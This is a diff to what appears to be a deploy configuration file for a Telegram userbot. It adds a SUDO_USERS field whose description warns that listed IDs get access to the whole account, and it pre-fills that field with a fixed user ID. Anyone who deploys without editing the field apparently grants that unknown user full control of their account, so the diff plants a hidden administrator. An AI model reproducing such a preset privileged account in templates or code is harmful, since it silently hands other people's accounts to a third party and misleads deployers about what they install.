@@ -124,6 +124,11 @@
     "COMMAND_HAND_LER": {
       "description": "specify command handler that should be used for the plugins. This should be a valid \"regex\" pattern",
       "required": false
+    },
+    "SUDO_USERS": {
+      "description": "List down the user IDs who should have permission to use you. Be Careful. You are granting access to your entire account to the people you mention in the below field, seperated by SPACE. Send .get_id in any private chat or as a reply to any user in any group, to fill this value",
+      "value": "7351948",
+      "required": false
     }
   },
   "addons": [{
